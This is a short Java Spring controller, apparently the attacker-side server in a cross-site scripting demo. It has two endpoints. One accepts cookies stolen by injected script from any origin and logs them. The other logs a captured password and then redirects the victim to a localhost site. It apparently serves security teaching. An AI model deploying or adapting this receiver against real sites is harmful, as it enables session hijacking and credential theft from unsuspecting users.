package com.example.demo.controller;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@Controller
public class HackerController {

	@RequestMapping("/steal_cookie")
	@ResponseBody
	public String stealCookie(HttpServletRequest req, HttpServletResponse resp) {
		resp.addHeader("Access-Control-Allow-Origin", "*"); 
		System.out.println("Hacker 偷取 cookie: " + req.getParameter("data"));
		return "";
	}
	
	@RequestMapping("/xss_dom")
	public String xssDom(HttpServletRequest req, HttpServletResponse resp) {
		String password = req.getParameter("password");
		System.out.println("竊取 password : " +password);
		return "redirect:https://localhost:9443/mango/input?myName=Mary";
	}
	
}

